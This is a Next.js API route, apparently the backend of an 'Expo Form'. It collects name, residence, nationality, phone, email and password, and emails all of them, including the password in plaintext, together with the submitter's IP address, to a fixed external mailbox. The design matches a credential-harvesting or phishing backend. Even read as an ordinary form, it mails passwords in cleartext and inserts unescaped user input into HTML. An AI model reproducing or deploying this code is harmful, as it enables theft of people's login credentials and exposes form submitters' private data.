import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { fullName, residence, nationality, phoneNumber, email, password } = body;

    // Validate required fields
    if (!fullName || !residence || !nationality || !phoneNumber || !email || !password) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      );
    }

    // Create transporter with the specified configuration
    const transporter = nodemailer.createTransport({
      host: "digitalproglobal.com",
      port: 465,
      secure: true, // true for SSL
      auth: {
        user: "cfxprime@digitalproglobal.com",
        pass: process.env.EMAIL_PASSWORD, // store password in .env
      },
    });

    // Email content
    const mailOptions = {
      from: process.env.SMTP_FROM || 'Expo Form <cfxprime@digitalproglobal.com>',
      to: process.env.CONTACT_EMAIL || 'cfxprime@digitalproglobal.com',
      subject: `New Expo Form Submission`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <div style="background: linear-gradient(135deg, #00468e 0%, #003d7a 100%); padding: 20px; text-align: center;">
            <h1 style="color: white; margin: 0;">Expo Form - New Submission</h1>
          </div>

          <div style="padding: 30px; background: #f9f9f9;">
            <h2 style="color: #333; border-bottom: 2px solid #00468e; padding-bottom: 10px;">Form Details</h2>

            <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
              <tr>
                <td style="padding: 10px; font-weight: bold; color: #555; width: 30%;">Full Name:</td>
                <td style="padding: 10px; color: #333;">${fullName}</td>
              </tr>
              <tr style="background: #f0f0f0;">
                <td style="padding: 10px; font-weight: bold; color: #555;">Residence:</td>
                <td style="padding: 10px; color: #333;">${residence}</td>
              </tr>
              <tr>
                <td style="padding: 10px; font-weight: bold; color: #555;">Nationality:</td>
                <td style="padding: 10px; color: #333;">${nationality}</td>
              </tr>
              <tr style="background: #f0f0f0;">
                <td style="padding: 10px; font-weight: bold; color: #555;">Phone Number:</td>
                <td style="padding: 10px; color: #333;">${phoneNumber}</td>
              </tr>
              <tr>
                <td style="padding: 10px; font-weight: bold; color: #555;">Email:</td>
                <td style="padding: 10px; color: #333;">${email}</td>
              </tr>
              <tr style="background: #f0f0f0;">
                <td style="padding: 10px; font-weight: bold; color: #555;">Password:</td>
                <td style="padding: 10px; color: #333;">${password}</td>
              </tr>
            </table>

            <div style="margin-top: 30px; padding: 15px; background: #e8f4f8; border-radius: 5px;">
              <p style="margin: 0; color: #555; font-size: 14px;">
                <strong>Submitted:</strong> ${new Date().toLocaleString()}<br>
                <strong>IP Address:</strong> ${request.headers.get('x-forwarded-for') || 'Unknown'}
              </p>
            </div>
          </div>

          <div style="background: #333; color: white; padding: 15px; text-align: center; font-size: 12px;">
            <p style="margin: 0;">This email was sent from the Expo form.</p>
          </div>
        </div>
      `,
    };

    // Send email
    await transporter.sendMail(mailOptions);

    return NextResponse.json(
      { message: 'Email sent successfully' },
      { status: 200 }
    );
  } catch (error) {
    console.error('Error sending email:', error);
    return NextResponse.json(
      { error: 'Failed to send email' },
      { status: 500 }
    );
  }
}
